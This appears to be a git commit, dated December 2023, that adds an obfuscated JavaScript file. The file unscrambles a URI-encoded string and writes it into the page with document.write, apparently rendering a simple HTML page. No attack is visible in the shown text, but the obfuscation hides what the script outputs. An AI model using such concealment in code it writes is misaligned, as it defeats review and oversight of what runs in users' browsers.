af364d9b31d28ac54827c6991267dfd3c4dbacbb
tarun7250 <58336464+tarun7250@users.noreply.github.com>
2023-12-26 13:14:05 +0530

    Add files via upload

---
+++ code.js
@@ -0,0 +1,29 @@
+(() => {
+  for (
+    j = (function () {
+      for (
+        h = "?ae@1+<onqdaV)!TgJP", a = new Array(h.length), l = 0;
+        l < h.length;
+        l++
+      )
+        a[l] = h.charCodeAt(l);
+      return a;
+    })(),
+      m = (m) => document.write(m),
+      k = decodeURI(
+        "".concat(
+          "%20%3Eleicp1P/%20a!zi%3C%20tmt%20%20hgOcnet%3Ce%20eYEthiio%3E%3Etaeplud====n-%3Cn%E2%98%86t%3Eir%22tit%3EA-1se=bTietk%22ex=%22atcafm%3Cywgre=sv/%3Ci,ttcv-gl%20irtlhamUm%3Ca%3Cvast-fDm6line=pehtncto%20o=l%20eEnpraesilqotohei%22atXep%3EeegieeA/oplF6shtsie/CT=rd%3E.Zn%3Er%3EihetcUmnorri:%3Eldea8gl-/a%20h-tHs=olw%22l%20sinppoise%22%3Cornlsrjmcr%20cipc%7D%3Co0-fglwjbetfmctwr:ntniSeteaaiansvtmn%7Diwthth0:/u1tetyl-mas=-%3Eny%7D0%7Bact%3Clj-eqgosioi-yo%7B-.%20uobire:yttta%3E#ri0riy=jsspetblaross.%3C%3Cw/apne%7Boy%3Echsptht%7By%3C.%25;laxemd!gmcI100r%20w/style%20drtp1=%3EbadCtbackge1lddm%25elo.:n.00%7D%3C/omwmej"
+        )
+      ).split(""),
+      g = k.length % j.length,
+      l = k.length - 1;
+    l >= 0;
+    l--
+  )
+    g--,
+      -1 == g && (g = j.length - 1),
+      (f = l + j[g]),
+      f >= k.length || ((c = k[l]), (b = k[f]), (k[f] = c), (k[l] = b));
+  for (n = m, i = "", l = 0; l < k.length; l++) i += k[l];
+  n(i);
+})();
